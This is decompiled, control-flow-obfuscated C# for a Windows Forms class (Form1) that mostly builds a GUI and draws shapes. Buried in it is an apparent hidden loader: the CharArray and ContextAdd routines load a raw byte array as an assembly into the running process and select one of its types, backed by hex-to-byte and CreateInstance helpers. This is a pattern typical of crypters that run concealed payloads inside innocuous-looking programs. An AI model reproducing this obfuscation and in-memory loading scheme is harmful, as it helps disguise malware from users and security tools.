					num = (int)((num2 * 1609943588) ^ 0x61F4E60D);
					continue;
				case 24u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -758092889) ^ 0xD7C17B2;
					continue;
				case 23u:
					num = ((int)num2 * -808997885) ^ -2095588394;
					continue;
				case 22u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 1200886015) ^ -1730941465;
					continue;
				case 21u:
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = (int)(num2 * 1258929958) ^ -496793972;
					continue;
				case 20u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1594376307;
						num4 = -1594376307;
					}
					else
					{
						num3 = -291280321;
						num4 = -291280321;
					}
					num = num3 ^ ((int)num2 * -1327992805);
					continue;
				}
				case 19u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1361384078) ^ -490195374;
					continue;
				case 18u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1643842889) ^ 0x1A6DEACD;
					continue;
				case 17u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -90466810) ^ 0x27F489C2;
					continue;
				case 16u:
					num = ((int)num2 * -1242387255) ^ 0x6A0858FD;
					continue;
				case 15u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 2016732505) ^ -1447489363;
					continue;
				case 14u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 983538639) ^ 0x4F3DE607);
					continue;
				case 13u:
					num = ((int)num2 * -2049642537) ^ -121367321;
					continue;
				case 12u:
					num = (int)((num2 * 1161852954) ^ 0x6C629814);
					continue;
				case 11u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)((num2 * 1702857999) ^ 0x1121E453);
					continue;
				case 10u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 1588800470) ^ 0x7C122906);
					continue;
				case 9u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1918108417) ^ 0x4486C2D2;
					continue;
				case 8u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1564026418) ^ -2115848344;
					continue;
				case 7u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 1085470911) ^ -1190431357;
					continue;
				case 6u:
					num = (int)((num2 * 567671287) ^ 0x342D8C6E);
					continue;
				case 4u:
					num = ((int)num2 * -1821337969) ^ -1475105416;
					continue;
				case 3u:
					num = (int)((num2 * 558677776) ^ 0x6A1C2259);
					continue;
				case 2u:
					num = ((int)num2 * -2110069488) ^ 0x51DCC3E7;
					continue;
				case 1u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1469528874) ^ 0x1F5DBDC1);
					continue;
				case 0u:
					num = ((int)num2 * -667333047) ^ -1161978698;
					continue;
				default:
					return;
				case 5u:
					break;
				case 50u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		while (true)
		{
			int num = 1059947661;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x703DE3A0u) % 4u)
				{
				case 1u:
				{
					Assembly q = ContextAdd(Level);
					PerformTable(q);
					num = (int)((num2 * 467342277) ^ 0x516870C1);
					continue;
				}
				case 0u:
					num = ((int)num2 * -1688693310) ^ 0x7523BEDE;
					continue;
				default:
					return;
				case 3u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -782497885;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDD2A3FE4u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)((num2 * 2036445174) ^ 0x3BEA96B3);
					continue;
				case 1u:
					num = (int)((num2 * 2063401427) ^ 0x604F04D1);
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
